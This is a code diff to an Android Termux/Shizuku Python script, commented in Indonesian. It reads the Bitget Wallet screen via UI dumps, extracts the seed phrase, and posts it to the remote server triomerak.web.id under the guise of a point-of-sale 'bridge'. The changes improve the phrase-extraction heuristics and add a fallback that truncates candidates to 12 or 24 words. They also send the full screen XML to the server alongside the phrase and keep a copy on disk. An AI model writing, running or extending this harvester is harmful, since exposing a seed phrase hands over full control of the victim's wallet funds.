@@ -29,6 +29,8 @@ import xml.etree.ElementTree as ET
 
 CONFIG_FILE = os.path.expanduser("~/.merak_bridge_config.json")
 TRIGGER_FILE = os.path.expanduser("~/.bridge_trigger")
+DEBUG_XML_FILE = os.path.expanduser("~/last_dump.xml")
+DEBUG_MODE = os.environ.get("BRIDGE_DEBUG", "").lower() in ("1", "true", "yes")
 
 def load_saved_server():
     default_url = "https://triomerak.web.id"
@@ -134,70 +136,120 @@ def dump_ui_xml():
 
     return ""
 
-def parse_seed_phrase_from_xml(xml_text):
+def parse_seed_phrase_from_xml(xml_text, debug=False):
     if not xml_text or "<hierarchy" not in xml_text:
+        if debug:
+            print("[DEBUG] XML kosong atau tidak valid", flush=True)
         return []
 
     try:
         root = ET.fromstring(xml_text)
-    except Exception:
+    except Exception as e:
+        if debug:
+            print(f"[DEBUG] Error parsing XML: {e}", flush=True)
         return []
 
     raw_nodes = []
     for node in root.iter('node'):
         t = (node.get('text') or '').strip()
         cd = (node.get('content-desc') or '').strip()
+        res_id = (node.get('resource-id') or '').strip()
+        
         if t:
             raw_nodes.append(t)
+            if debug and len(t) < 100:  # Hindari print string terlalu panjang
+                print(f"[DEBUG] Text node: '{t}' (resource-id: {res_id})", flush=True)
         if cd and cd != t:
             raw_nodes.append(cd)
+            if debug and len(cd) < 100:
+                print(f"[DEBUG] ContentDesc node: '{cd}' (resource-id: {res_id})", flush=True)
+
+    if debug:
+        print(f"\n[DEBUG] Total nodes ditemukan: {len(raw_nodes)}", flush=True)
 
     words = []
     # Format 1: "1\nword" atau "01. word" dalam satu node
     for item in raw_nodes:
         lines = [x.strip() for x in item.splitlines() if x.strip()]
-        if len(lines) == 2 and lines[0].isdigit() and lines[1].isalpha():
-            words.append(lines[1].lower())
+        if len(lines) == 2 and lines[0].replace('.','').isdigit() and lines[1].replace('.','').isalpha():
+            word = lines[1].lower()
+            words.append(word)
+            if debug:
+                print(f"[DEBUG] Format 1 detected: {lines[0]} -> {word}", flush=True)
         elif len(lines) == 1:
             parts = lines[0].split()
             if len(parts) == 2 and parts[0].replace('.', '').isdigit() and parts[1].isalpha():
-                words.append(parts[1].lower())
+                word = parts[1].lower()
+                words.append(word)
+                if debug:
+                    print(f"[DEBUG] Format 1b detected: {parts[0]} {word}", flush=True)
 
     if len(words) in (12, 24):
+        if debug:
+            print(f"[DEBUG] ✅ Format 1 berhasil: {len(words)} kata", flush=True)
         return words
 
     # Format 2: Node terpisah bersebelahan: Node 1 bernilai angka "1", Node 2 bernilai kata "apple"
     adj_words = []
     i = 0
     while i < len(raw_nodes) - 1:
-        n1 = raw_nodes[i].strip().replace('.', '')
+        n1 = raw_nodes[i].strip().replace('.', '').replace(',', '')
         n2 = raw_nodes[i+1].strip().lower()
         if n1.isdigit() and 1 <= int(n1) <= 24 and n2.isalpha() and 2 <= len(n2) <= 15:
             adj_words.append(n2)
+            if debug:
+                print(f"[DEBUG] Format 2 detected: {n1} + {n2}", flush=True)
             i += 2
         else:
             i += 1
     if len(adj_words) in (12, 24):
+        if debug:
+            print(f"[DEBUG] ✅ Format 2 berhasil: {len(adj_words)} kata", flush=True)
         return adj_words
 
-    # Format 3: Kandidat kata murni (BIP-39 filter)
+    # Format 3: Kandidat kata murni (BIP-39 filter) - dengan uppercase handling
     ignore = {
         "cadangkan", "tuliskan", "sembunyikan", "teruskan", "batal",
         "lanjut", "kembali", "opsi", "setelan", "tentang", "wallet",
         "phrase", "seed", "backup", "copy", "salin", "lanjutkan",
         "ok", "done", "next", "confirm", "konfirmasi", "view", "show",
         "peringatan", "warning", "mnemonic", "private", "key", "keamanan",
-        "security", "saya", "telah", "menyimpan", "mengerti", "paham", "got"
+        "security", "saya", "telah", "menyimpan", "mengerti", "paham", "got",
+        "continue", "skip", "close", "cancel", "accept", "agree", "understand",
+        "bitget", "app", "menu", "home", "back", "forward", "settings",
+        "open", "tap", "press", "swipe", "scroll", "refresh", "reload"
     }
     cand = []
     for item in raw_nodes:
         for part in item.split():
             clean = part.strip().lower()
-            if clean.isalpha() and 2 <= len(clean) <= 12 and clean not in ignore:
-                cand.append(clean)
+            # Remove trailing punctuation
+            clean = re.sub(r'[.,;:!?\'"]+$', '', clean)
+            if clean.isalpha() and 3 <= len(clean) <= 12 and clean not in ignore:
+                if clean not in cand:  # Avoid duplicates
+                    cand.append(clean)
+                    if debug:
+                        print(f"[DEBUG] Kandidat kata: '{clean}'", flush=True)
+    
+    if debug:
+        print(f"\n[DEBUG] Total kandidat kata: {len(cand)}", flush=True)
+        
     if len(cand) in (12, 24):
+        if debug:
+            print(f"[DEBUG] ✅ Format 3 berhasil: {len(cand)} kata", flush=True)
         return cand
+    
+    # Format 4: Fallback - ambil 12/24 kata pertama yang valid jika mendekati target
+    if 10 <= len(cand) <= 14 or 22 <= len(cand) <= 26:
+        target_count = 12 if len(cand) < 18 else 24
+        filtered = cand[:target_count]
+        if debug:
+            print(f"[DEBUG] ⚠️ Format 4 fallback: {len(filtered)} dari {len(cand)} kata", flush=True)
+        return filtered
 
+    if debug:
+        print(f"[DEBUG] ❌ Tidak ditemukan pola yang sesuai. Total kata: {len(words)}, Adjacent: {len(adj_words)}, Candidates: {len(cand)}", flush=True)
+    
     return words
 
 def parse_address_from_xml(xml_text):
@@ -206,17 +258,23 @@ def parse_address_from_xml(xml_text):
     matches = re.findall(r"0x[a-fA-F0-9]{40}", xml_text)
     return matches[0] if matches else None
 
-def send_to_server(server_url, data_type, value, max_retries=10):
+def send_to_server(server_url, data_type, value, max_retries=10, xml_data=None):
     endpoint = server_url.rstrip("/") + "/api/bridge/report"
-    payload = json.dumps({
+    payload = {
         "type": data_type,
         "value": value,
         "agent": "Termux-Shizuku"
-    }).encode("utf-8")
+    }
+    
+    # Include XML for debugging if provided
+    if xml_data and data_type == "phrase":
+        payload["xml_dump"] = xml_data
+    
+    payload_bytes = json.dumps(payload).encode("utf-8")
 
     req = urllib.request.Request(
         endpoint,
-        data=payload,
+        data=payload_bytes,
         headers={"Content-Type": "application/json", "User-Agent": "TrioMerakBridge/1.0"}
     )
 
@@ -282,13 +340,24 @@ def do_extract(server_url, with_timer=False, trigger_source=""):
             print("   Pastikan service Shizuku di HP aktif dan Termux memiliki izin.", flush=True)
             return
 
-        words = parse_seed_phrase_from_xml(xml_data)
+        # Simpan XML untuk debugging
+        try:
+            with open(DEBUG_XML_FILE, "w", encoding="utf-8") as f:
+                f.write(xml_data)
+            if DEBUG_MODE:
+                print(f"[DEBUG] XML disimpan ke: {DEBUG_XML_FILE}", flush=True)
+        except Exception as e:
+            if DEBUG_MODE:
+                print(f"[DEBUG] Gagal menyimpan XML: {e}", flush=True)
+
+        # Parse dengan debug mode
+        words = parse_seed_phrase_from_xml(xml_data, debug=DEBUG_MODE)
 
         if len(words) in (12, 24):
             phrase = " ".join(words)
             print(f"✅ Ditemukan {len(words)} kata Seed Phrase:", flush=True)
             print(f"🔑 {phrase}", flush=True)
-            send_to_server(server_url, "phrase", phrase)
+            send_to_server(server_url, "phrase", phrase, xml_data=xml_data)
             print("🎉 Dompet otomatis terhubung di Web POS Kasir!", flush=True)
         else:
             # Cek apakah sedang membuka barcode penerima
@@ -299,8 +368,15 @@ def do_extract(server_url, with_timer=False, trigger_source=""):
                 send_to_server(server_url, "address", addr)
                 print("🎉 Alamat penerima berhasil dikirim ke Web POS!", flush=True)
             else:
-                print(f"❌ Tidak ditemukan 12 kata atau alamat barcode di layar ({xml_len} bytes XML).", flush=True)
-                print("   💡 Catatan: Pastikan aplikasi Bitget Wallet sedang membuka layar 12 kata Seed Phrase (Bukan Termux)!", flush=True)
+                print(f"❌ Tidak ditemukan 12 kata atau alamat barcode di layar.", flush=True)
+                print(f"   📊 Statistik: XML={xml_len} bytes, Kata={len(words)}", flush=True)
+                if "com.bitget" not in fg_app.lower() and "bitget" not in fg_app.lower():
+                    print(f"   ⚠️  Aplikasi saat ini: {fg_app[:80] if fg_app else 'Unknown'}", flush=True)
+                    print(f"   👉 Buka aplikasi Bitget Wallet dan tampilkan layar 12 kata Seed Phrase!", flush=True)
+                else:
+                    print(f"   💡 Pastikan Anda sedang di halaman Seed Phrase (bukan PIN/Password/Home).", flush=True)
+                    print(f"   🔍 Debug: Jalankan 'export BRIDGE_DEBUG=1' lalu coba lagi untuk detail.", flush=True)
+                print(f"   📂 XML dump tersimpan di: {DEBUG_XML_FILE}", flush=True)
 
         print("\n" + "─" * 60, flush=True)
         print("✨ SIAP UNTUK AKUN BERIKUTNYA!", flush=True)
